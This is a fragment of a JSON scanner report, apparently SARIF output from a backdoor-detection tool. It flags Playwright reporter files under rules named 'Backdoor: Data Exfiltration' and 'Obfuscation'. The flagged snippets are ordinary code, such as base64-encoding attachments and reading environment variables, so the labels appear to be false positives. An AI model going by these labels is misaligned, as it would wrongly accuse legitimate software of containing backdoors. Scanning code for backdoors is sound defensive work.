                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/reporters/json.js"
                },
                "region": {
                  "startLine": 197,
                  "startColumn": 95,
                  "endLine": 197,
                  "endColumn": 101,
                  "snippet": {
                    "text": "          name: a.name,\n          contentType: a.contentType,\n          path: a.path,\n          body: (_a$body = a.body) === null || _a$body === void 0 ? void 0 : _a$body.toString('base64')\n        };\n      })\n    };\n",
                    "rendered": {
                      "text": "          name: a.name,\n          contentType: a.contentType,\n          path: a.path,\n          body: (_a$body = a.body) === null || _a$body === void 0 ? void 0 : _a$body.toString('base64')\n        };\n      })\n    };\n",
                      "markdown": "`          name: a.name,\n          contentType: a.contentType,\n          path: a.path,\n          body: (_a$body = a.body) === null || _a$body === void 0 ? void 0 : _a$body.toString('base64')\n        };\n      })\n    };\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/reporters/blob.js"
                },
                "region": {
                  "startLine": 100,
                  "startColumn": 9,
                  "endLine": 100,
                  "endColumn": 20,
                  "snippet": {
                    "text": "        outputDir: 'blob-report'\n      }\n    });\n    if (!process.env.PWTEST_BLOB_DO_NOT_REMOVE) await (0, _utils.removeFolders)([outputDir]);\n    await _fs.default.promises.mkdir(_path.default.dirname(outputFile), {\n      recursive: true\n    });\n",
                    "rendered": {
                      "text": "        outputDir: 'blob-report'\n      }\n    });\n    if (!process.env.PWTEST_BLOB_DO_NOT_REMOVE) await (0, _utils.removeFolders)([outputDir]);\n    await _fs.default.promises.mkdir(_path.default.dirname(outputFile), {\n      recursive: true\n    });\n",
                      "markdown": "`        outputDir: 'blob-report'\n      }\n    });\n    if (!process.env.PWTEST_BLOB_DO_NOT_REMOVE) await (0, _utils.removeFolders)([outputDir]);\n    await _fs.default.promises.mkdir(_path.default.dirname(outputFile), {\n      recursive: true\n    });\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/reporters/blob.js"
                },
                "region": {
                  "startLine": 50,
                  "startColumn": 12,
                  "endLine": 50,
                  "endColumn": 23,
                  "snippet": {
                    "text": "    const metadata = {\n      version: currentBlobReportVersion,\n      userAgent: (0, _utils.getUserAgent)(),\n      name: process.env.PWTEST_BOT_NAME,\n      shard: (_config$shard = config.shard) !== null && _config$shard !== void 0 ? _config$shard : undefined,\n      pathSeparator: _path.default.sep\n    };\n",
                    "rendered": {
                      "text": "    const metadata = {\n      version: currentBlobReportVersion,\n      userAgent: (0, _utils.getUserAgent)(),\n      name: process.env.PWTEST_BOT_NAME,\n      shard: (_config$shard = config.shard) !== null && _config$shard !== void 0 ? _config$shard : undefined,\n      pathSeparator: _path.default.sep\n    };\n",
                      "markdown": "`    const metadata = {\n      version: currentBlobReportVersion,\n      userAgent: (0, _utils.getUserAgent)(),\n      name: process.env.PWTEST_BOT_NAME,\n      shard: (_config$shard = config.shard) !== null && _config$shard !== void 0 ? _config$shard : undefined,\n      pathSeparator: _path.default.sep\n    };\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000800"
          },
          "message": {
            "text": "Backdoor: Obfuscation",
            "id": "BD000800"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/reporters/teleEmitter.js"
                },
                "region": {
                  "startLine": 236,
                  "startColumn": 79,
                  "endLine": 236,
                  "endColumn": 85,
                  "snippet": {
                    "text": "      return {\n        ...a,\n        // There is no Buffer in the browser, so there is no point in sending the data there.\n        base64: a.body && !this._emitterOptions.omitBuffers ? a.body.toString('base64') : undefined\n      };\n    });\n  }\n",
                    "rendered": {
                      "text": "      return {\n        ...a,\n        // There is no Buffer in the browser, so there is no point in sending the data there.\n        base64: a.body && !this._emitterOptions.omitBuffers ? a.body.toString('base64') : undefined\n      };\n    });\n  }\n",
                      "markdown": "`      return {\n        ...a,\n        // There is no Buffer in the browser, so there is no point in sending the data there.\n        base64: a.body && !this._emitterOptions.omitBuffers ? a.body.toString('base64') : undefined\n      };\n    });\n  }\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000800"
          },
          "message": {
            "text": "Backdoor: Obfuscation",
            "id": "BD000800"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/reporters/teleEmitter.js"
                },
                "region": {
                  "startLine": 236,
                  "startColumn": 8,
                  "endLine": 236,
                  "endColumn": 14,
                  "snippet": {
                    "text": "      return {\n        ...a,\n        // There is no Buffer in the browser, so there is no point in sending the data there.\n        base64: a.body && !this._emitterOptions.omitBuffers ? a.body.toString('base64') : undefined\n      };\n    });\n  }\n",
                    "rendered": {
                      "text": "      return {\n        ...a,\n        // There is no Buffer in the browser, so there is no point in sending the data there.\n        base64: a.body && !this._emitterOptions.omitBuffers ? a.body.toString('base64') : undefined\n      };\n    });\n  }\n",
                      "markdown": "`      return {\n        ...a,\n        // There is no Buffer in the browser, so there is no point in sending the data there.\n        base64: a.body && !this._emitterOptions.omitBuffers ? a.body.toString('base64') : undefined\n      };\n    });\n  }\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000800"
          },
          "message": {
            "text": "Backdoor: Obfuscation",
            "id": "BD000800"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/reporters/teleEmitter.js"
                },
                "region": {
                  "startLine": 128,
                  "startColumn": 44,
                  "endLine": 128,
                  "endColumn": 50,
                  "snippet": {
                    "text": "  _onStdIO(type, chunk, test, result) {\n    if (this._emitterOptions.omitOutput) return;\n    const isBase64 = typeof chunk !== 'string';\n    const data = isBase64 ? chunk.toString('base64') : chunk;\n    this._messageSink({\n      method: 'onStdIO',\n      params: {\n",
                    "rendered": {
                      "text": "  _onStdIO(type, chunk, test, result) {\n    if (this._emitterOptions.omitOutput) return;\n    const isBase64 = typeof chunk !== 'string';\n    const data = isBase64 ? chunk.toString('base64') : chunk;\n    this._messageSink({\n      method: 'onStdIO',\n      params: {\n",
                      "markdown": "`  _onStdIO(type, chunk, test, result) {\n    if (this._emitterOptions.omitOutput) return;\n    const isBase64 = typeof chunk !== 'string';\n    const data = isBase64 ? chunk.toString('base64') : chunk;\n    this._messageSink({\n      method: 'onStdIO',\n      params: {\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/reporters/list.js"
                },
                "region": {
                  "startLine": 165,
                  "startColumn": 43,
                  "endLine": 165,
                  "endColumn": 48,
                  "snippet": {
                    "text": "      }\n      text += this._retrySuffix(result) + _base.colors.dim(` (${(0, _utilsBundle.ms)(result.duration)})`);\n    }\n    this._updateOrAppendLine(this._testRows.get(test), text, prefix);\n  }\n  _updateOrAppendLine(row, text, prefix) {\n    if (_base.isTTY) {\n",
                    "rendered": {
                      "text": "      }\n      text += this._retrySuffix(result) + _base.colors.dim(` (${(0, _utilsBundle.ms)(result.duration)})`);\n    }\n    this._updateOrAppendLine(this._testRows.get(test), text, prefix);\n  }\n  _updateOrAppendLine(row, text, prefix) {\n    if (_base.isTTY) {\n",
                      "markdown": "`      }\n      text += this._retrySuffix(result) + _base.colors.dim(` (${(0, _utilsBundle.ms)(result.duration)})`);\n    }\n    this._updateOrAppendLine(this._testRows.get(test), text, prefix);\n  }\n  _updateOrAppendLine(row, text, prefix) {\n    if (_base.isTTY) {\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/reporters/list.js"
                },
                "region": {
                  "startLine": 145,
                  "startColumn": 33,
                  "endLine": 145,
                  "endColumn": 38,
                  "snippet": {
                    "text": "\n    // In TTY mode test index is incremented in onTestStart\n    // and in non-TTY mode it is incremented onTestEnd.\n    let index = this._resultIndex.get(result);\n    if (!index) {\n      index = String(this._resultIndex.size + 1);\n      this._resultIndex.set(result, index);\n",
                    "rendered": {
                      "text": "\n    // In TTY mode test index is incremented in onTestStart\n    // and in non-TTY mode it is incremented onTestEnd.\n    let index = this._resultIndex.get(result);\n    if (!index) {\n      index = String(this._resultIndex.size + 1);\n      this._resultIndex.set(result, index);\n",
                      "markdown": "`\n    // In TTY mode test index is incremented in onTestStart\n    // and in non-TTY mode it is incremented onTestEnd.\n    let index = this._resultIndex.get(result);\n    if (!index) {\n      index = String(this._resultIndex.size + 1);\n      this._resultIndex.set(result, index);\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/reporters/list.js"
                },
                "region": {
                  "startLine": 107,
                  "startColumn": 43,
                  "endLine": 107,
                  "endColumn": 48,
                  "snippet": {
                    "text": "    let text = '';\n    if (step.error) text = _base.colors.red(title);else text = title;\n    text += _base.colors.dim(` (${(0, _utilsBundle.ms)(step.duration)})`);\n    this._updateOrAppendLine(this._stepRows.get(step), text, prefix);\n  }\n  _maybeWriteNewLine() {\n    if (this._needNewLine) {\n",
                    "rendered": {
                      "text": "    let text = '';\n    if (step.error) text = _base.colors.red(title);else text = title;\n    text += _base.colors.dim(` (${(0, _utilsBundle.ms)(step.duration)})`);\n    this._updateOrAppendLine(this._stepRows.get(step), text, prefix);\n  }\n  _maybeWriteNewLine() {\n    if (this._needNewLine) {\n",
                      "markdown": "`    let text = '';\n    if (step.error) text = _base.colors.red(title);else text = title;\n    text += _base.colors.dim(` (${(0, _utilsBundle.ms)(step.duration)})`);\n    this._updateOrAppendLine(this._stepRows.get(step), text, prefix);\n  }\n  _maybeWriteNewLine() {\n    if (this._needNewLine) {\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/reporters/list.js"
                },
                "region": {
                  "startLine": 101,
                  "startColumn": 33,
                  "endLine": 101,
                  "endColumn": 38,
                  "snippet": {
                    "text": "      if (_base.isTTY) this._updateLine(this._testRows.get(test), _base.colors.dim((0, _base.formatTestTitle)(this.config, test, step.parent)) + this._retrySuffix(result), this._testPrefix(testIndex, ''));\n      return;\n    }\n    const index = this._stepIndex.get(step);\n    const title = test.title + _base.colors.dim((0, _base.stepSuffix)(step));\n    const prefix = this._testPrefix(index, '');\n    let text = '';\n",
                    "rendered": {
                      "text": "      if (_base.isTTY) this._updateLine(this._testRows.get(test), _base.colors.dim((0, _base.formatTestTitle)(this.config, test, step.parent)) + this._retrySuffix(result), this._testPrefix(testIndex, ''));\n      return;\n    }\n    const index = this._stepIndex.get(step);\n    const title = test.title + _base.colors.dim((0, _base.stepSuffix)(step));\n    const prefix = this._testPrefix(index, '');\n    let text = '';\n",
                      "markdown": "`      if (_base.isTTY) this._updateLine(this._testRows.get(test), _base.colors.dim((0, _base.formatTestTitle)(this.config, test, step.parent)) + this._retrySuffix(result), this._testPrefix(testIndex, ''));\n      return;\n    }\n    const index = this._stepIndex.get(step);\n    const title = test.title + _base.colors.dim((0, _base.stepSuffix)(step));\n    const prefix = this._testPrefix(index, '');\n    let text = '';\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/reporters/list.js"
                },
                "region": {
                  "startLine": 98,
                  "startColumn": 54,
                  "endLine": 98,
                  "endColumn": 59,
                  "snippet": {
                    "text": "    if (step.category !== 'test.step') return;\n    const testIndex = this._resultIndex.get(result) || '';\n    if (!this._printSteps) {\n      if (_base.isTTY) this._updateLine(this._testRows.get(test), _base.colors.dim((0, _base.formatTestTitle)(this.config, test, step.parent)) + this._retrySuffix(result), this._testPrefix(testIndex, ''));\n      return;\n    }\n    const index = this._stepIndex.get(step);\n",
                    "rendered": {
                      "text": "    if (step.category !== 'test.step') return;\n    const testIndex = this._resultIndex.get(result) || '';\n    if (!this._printSteps) {\n      if (_base.isTTY) this._updateLine(this._testRows.get(test), _base.colors.dim((0, _base.formatTestTitle)(this.config, test, step.parent)) + this._retrySuffix(result), this._testPrefix(testIndex, ''));\n      return;\n    }\n    const index = this._stepIndex.get(step);\n",
                      "markdown": "`    if (step.category !== 'test.step') return;\n    const testIndex = this._resultIndex.get(result) || '';\n    if (!this._printSteps) {\n      if (_base.isTTY) this._updateLine(this._testRows.get(test), _base.colors.dim((0, _base.formatTestTitle)(this.config, test, step.parent)) + this._retrySuffix(result), this._testPrefix(testIndex, ''));\n      return;\n    }\n    const index = this._stepIndex.get(step);\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/reporters/list.js"
                },
                "region": {
                  "startLine": 96,
                  "startColumn": 39,
                  "endLine": 96,
                  "endColumn": 44,
                  "snippet": {
                    "text": "  onStepEnd(test, result, step) {\n    super.onStepEnd(test, result, step);\n    if (step.category !== 'test.step') return;\n    const testIndex = this._resultIndex.get(result) || '';\n    if (!this._printSteps) {\n      if (_base.isTTY) this._updateLine(this._testRows.get(test), _base.colors.dim((0, _base.formatTestTitle)(this.config, test, step.parent)) + this._retrySuffix(result), this._testPrefix(testIndex, ''));\n      return;\n",
                    "rendered": {
                      "text": "  onStepEnd(test, result, step) {\n    super.onStepEnd(test, result, step);\n    if (step.category !== 'test.step') return;\n    const testIndex = this._resultIndex.get(result) || '';\n    if (!this._printSteps) {\n      if (_base.isTTY) this._updateLine(this._testRows.get(test), _base.colors.dim((0, _base.formatTestTitle)(this.config, test, step.parent)) + this._retrySuffix(result), this._testPrefix(testIndex, ''));\n      return;\n",
                      "markdown": "`  onStepEnd(test, result, step) {\n    super.onStepEnd(test, result, step);\n    if (step.category !== 'test.step') return;\n    const testIndex = this._resultIndex.get(result) || '';\n    if (!this._printSteps) {\n      if (_base.isTTY) this._updateLine(this._testRows.get(test), _base.colors.dim((0, _base.formatTestTitle)(this.config, test, step.parent)) + this._retrySuffix(result), this._testPrefix(testIndex, ''));\n      return;\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/reporters/list.js"
                },
                "region": {
                  "startLine": 78,
                  "startColumn": 54,
                  "endLine": 78,
                  "endColumn": 59,
                  "snippet": {
                    "text": "    if (step.category !== 'test.step') return;\n    const testIndex = this._resultIndex.get(result) || '';\n    if (!this._printSteps) {\n      if (_base.isTTY) this._updateLine(this._testRows.get(test), _base.colors.dim((0, _base.formatTestTitle)(this.config, test, step)) + this._retrySuffix(result), this._testPrefix(testIndex, ''));\n      return;\n    }\n    const ordinal = (result[lastStepOrdinalSymbol] || 0) + 1;\n",
                    "rendered": {
                      "text": "    if (step.category !== 'test.step') return;\n    const testIndex = this._resultIndex.get(result) || '';\n    if (!this._printSteps) {\n      if (_base.isTTY) this._updateLine(this._testRows.get(test), _base.colors.dim((0, _base.formatTestTitle)(this.config, test, step)) + this._retrySuffix(result), this._testPrefix(testIndex, ''));\n      return;\n    }\n    const ordinal = (result[lastStepOrdinalSymbol] || 0) + 1;\n",
                      "markdown": "`    if (step.category !== 'test.step') return;\n    const testIndex = this._resultIndex.get(result) || '';\n    if (!this._printSteps) {\n      if (_base.isTTY) this._updateLine(this._testRows.get(test), _base.colors.dim((0, _base.formatTestTitle)(this.config, test, step)) + this._retrySuffix(result), this._testPrefix(testIndex, ''));\n      return;\n    }\n    const ordinal = (result[lastStepOrdinalSymbol] || 0) + 1;\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/reporters/list.js"
                },
                "region": {
                  "startLine": 76,
                  "startColumn": 39,
                  "endLine": 76,
                  "endColumn": 44,
                  "snippet": {
                    "text": "  onStepBegin(test, result, step) {\n    super.onStepBegin(test, result, step);\n    if (step.category !== 'test.step') return;\n    const testIndex = this._resultIndex.get(result) || '';\n    if (!this._printSteps) {\n      if (_base.isTTY) this._updateLine(this._testRows.get(test), _base.colors.dim((0, _base.formatTestTitle)(this.config, test, step)) + this._retrySuffix(result), this._testPrefix(testIndex, ''));\n      return;\n",
                    "rendered": {
                      "text": "  onStepBegin(test, result, step) {\n    super.onStepBegin(test, result, step);\n    if (step.category !== 'test.step') return;\n    const testIndex = this._resultIndex.get(result) || '';\n    if (!this._printSteps) {\n      if (_base.isTTY) this._updateLine(this._testRows.get(test), _base.colors.dim((0, _base.formatTestTitle)(this.config, test, step)) + this._retrySuffix(result), this._testPrefix(testIndex, ''));\n      return;\n",
                      "markdown": "`  onStepBegin(test, result, step) {\n    super.onStepBegin(test, result, step);\n    if (step.category !== 'test.step') return;\n    const testIndex = this._resultIndex.get(result) || '';\n    if (!this._printSteps) {\n      if (_base.isTTY) this._updateLine(this._testRows.get(test), _base.colors.dim((0, _base.formatTestTitle)(this.config, test, step)) + this._retrySuffix(result), this._testPrefix(testIndex, ''));\n      return;\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/reporters/list.js"
                },
                "region": {
                  "startLine": 187,
                  "startColumn": 8,
                  "endLine": 187,
                  "endColumn": 19,
                  "snippet": {
                    "text": "  }\n  _updateLine(row, text, prefix) {\n    const line = prefix + this.fitToScreen(text, prefix);\n    if (process.env.PW_TEST_DEBUG_REPORTERS) process.stdout.write(row + ' : ' + line + '\\n');else this._updateLineForTTY(row, line);\n  }\n  _updateLineForTTY(row, line) {\n    // Go up if needed\n",
                    "rendered": {
                      "text": "  }\n  _updateLine(row, text, prefix) {\n    const line = prefix + this.fitToScreen(text, prefix);\n    if (process.env.PW_TEST_DEBUG_REPORTERS) process.stdout.write(row + ' : ' + line + '\\n');else this._updateLineForTTY(row, line);\n  }\n  _updateLineForTTY(row, line) {\n    // Go up if needed\n",
                      "markdown": "`  }\n  _updateLine(row, text, prefix) {\n    const line = prefix + this.fitToScreen(text, prefix);\n    if (process.env.PW_TEST_DEBUG_REPORTERS) process.stdout.write(row + ' : ' + line + '\\n');else this._updateLineForTTY(row, line);\n  }\n  _updateLineForTTY(row, line) {\n    // Go up if needed\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/reporters/list.js"
                },
                "region": {
                  "startLine": 177,
                  "startColumn": 8,
                  "endLine": 177,
                  "endColumn": 19,
                  "snippet": {
                    "text": "  }\n  _appendLine(text, prefix) {\n    const line = prefix + this.fitToScreen(text, prefix);\n    if (process.env.PW_TEST_DEBUG_REPORTERS) {\n      process.stdout.write(this._lastRow + ' : ' + line + '\\n');\n    } else {\n      process.stdout.write(line);\n",
                    "rendered": {
                      "text": "  }\n  _appendLine(text, prefix) {\n    const line = prefix + this.fitToScreen(text, prefix);\n    if (process.env.PW_TEST_DEBUG_REPORTERS) {\n      process.stdout.write(this._lastRow + ' : ' + line + '\\n');\n    } else {\n      process.stdout.write(line);\n",
                      "markdown": "`  }\n  _appendLine(text, prefix) {\n    const line = prefix + this.fitToScreen(text, prefix);\n    if (process.env.PW_TEST_DEBUG_REPORTERS) {\n      process.stdout.write(this._lastRow + ' : ' + line + '\\n');\n    } else {\n      process.stdout.write(line);\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/reporters/list.js"
                },
                "region": {
                  "startLine": 27,
                  "startColumn": 116,
                  "endLine": 27,
                  "endColumn": 127,
                  "snippet": {
                    "text": " */\n\n// Allow it in the Visual Studio Code Terminal and the new Windows Terminal\nconst DOES_NOT_SUPPORT_UTF8_IN_TERMINAL = process.platform === 'win32' && process.env.TERM_PROGRAM !== 'vscode' && !process.env.WT_SESSION;\nconst POSITIVE_STATUS_MARK = DOES_NOT_SUPPORT_UTF8_IN_TERMINAL ? 'ok' : '✓';\nconst NEGATIVE_STATUS_MARK = DOES_NOT_SUPPORT_UTF8_IN_TERMINAL ? 'x' : '✘';\nclass ListReporter extends _base.BaseReporter {\n",
                    "rendered": {
                      "text": " */\n\n// Allow it in the Visual Studio Code Terminal and the new Windows Terminal\nconst DOES_NOT_SUPPORT_UTF8_IN_TERMINAL = process.platform === 'win32' && process.env.TERM_PROGRAM !== 'vscode' && !process.env.WT_SESSION;\nconst POSITIVE_STATUS_MARK = DOES_NOT_SUPPORT_UTF8_IN_TERMINAL ? 'ok' : '✓';\nconst NEGATIVE_STATUS_MARK = DOES_NOT_SUPPORT_UTF8_IN_TERMINAL ? 'x' : '✘';\nclass ListReporter extends _base.BaseReporter {\n",
                      "markdown": "` */\n\n// Allow it in the Visual Studio Code Terminal and the new Windows Terminal\nconst DOES_NOT_SUPPORT_UTF8_IN_TERMINAL = process.platform === 'win32' && process.env.TERM_PROGRAM !== 'vscode' && !process.env.WT_SESSION;\nconst POSITIVE_STATUS_MARK = DOES_NOT_SUPPORT_UTF8_IN_TERMINAL ? 'ok' : '✓';\nconst NEGATIVE_STATUS_MARK = DOES_NOT_SUPPORT_UTF8_IN_TERMINAL ? 'x' : '✘';\nclass ListReporter extends _base.BaseReporter {\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/reporters/list.js"
                },
                "region": {
                  "startLine": 27,
                  "startColumn": 74,
                  "endLine": 27,
                  "endColumn": 85,
                  "snippet": {
                    "text": " */\n\n// Allow it in the Visual Studio Code Terminal and the new Windows Terminal\nconst DOES_NOT_SUPPORT_UTF8_IN_TERMINAL = process.platform === 'win32' && process.env.TERM_PROGRAM !== 'vscode' && !process.env.WT_SESSION;\nconst POSITIVE_STATUS_MARK = DOES_NOT_SUPPORT_UTF8_IN_TERMINAL ? 'ok' : '✓';\nconst NEGATIVE_STATUS_MARK = DOES_NOT_SUPPORT_UTF8_IN_TERMINAL ? 'x' : '✘';\nclass ListReporter extends _base.BaseReporter {\n",
                    "rendered": {
                      "text": " */\n\n// Allow it in the Visual Studio Code Terminal and the new Windows Terminal\nconst DOES_NOT_SUPPORT_UTF8_IN_TERMINAL = process.platform === 'win32' && process.env.TERM_PROGRAM !== 'vscode' && !process.env.WT_SESSION;\nconst POSITIVE_STATUS_MARK = DOES_NOT_SUPPORT_UTF8_IN_TERMINAL ? 'ok' : '✓';\nconst NEGATIVE_STATUS_MARK = DOES_NOT_SUPPORT_UTF8_IN_TERMINAL ? 'x' : '✘';\nclass ListReporter extends _base.BaseReporter {\n",
                      "markdown": "` */\n\n// Allow it in the Visual Studio Code Terminal and the new Windows Terminal\nconst DOES_NOT_SUPPORT_UTF8_IN_TERMINAL = process.platform === 'win32' && process.env.TERM_PROGRAM !== 'vscode' && !process.env.WT_SESSION;\nconst POSITIVE_STATUS_MARK = DOES_NOT_SUPPORT_UTF8_IN_TERMINAL ? 'ok' : '✓';\nconst NEGATIVE_STATUS_MARK = DOES_NOT_SUPPORT_UTF8_IN_TERMINAL ? 'x' : '✘';\nclass ListReporter extends _base.BaseReporter {\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/reporters/github.js"
                },
                "region": {
                  "startLine": 113,
                  "startColumn": 57,
                  "endLine": 113,
                  "endColumn": 68,
                  "snippet": {
                    "text": "exports.GitHubReporter = GitHubReporter;\nfunction workspaceRelativePath(filePath) {\n  var _process$env$GITHUB_W;\n  return _path.default.relative((_process$env$GITHUB_W = process.env['GITHUB_WORKSPACE']) !== null && _process$env$GITHUB_W !== void 0 ? _process$env$GITHUB_W : '', filePath);\n}\nvar _default = exports.default = GitHubReporter;",
                    "rendered": {
                      "text": "exports.GitHubReporter = GitHubReporter;\nfunction workspaceRelativePath(filePath) {\n  var _process$env$GITHUB_W;\n  return _path.default.relative((_process$env$GITHUB_W = process.env['GITHUB_WORKSPACE']) !== null && _process$env$GITHUB_W !== void 0 ? _process$env$GITHUB_W : '', filePath);\n}\nvar _default = exports.default = GitHubReporter;",
                      "markdown": "`exports.GitHubReporter = GitHubReporter;\nfunction workspaceRelativePath(filePath) {\n  var _process$env$GITHUB_W;\n  return _path.default.relative((_process$env$GITHUB_W = process.env['GITHUB_WORKSPACE']) !== null && _process$env$GITHUB_W !== void 0 ? _process$env$GITHUB_W : '', filePath);\n}\nvar _default = exports.default = GitHubReporter;`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
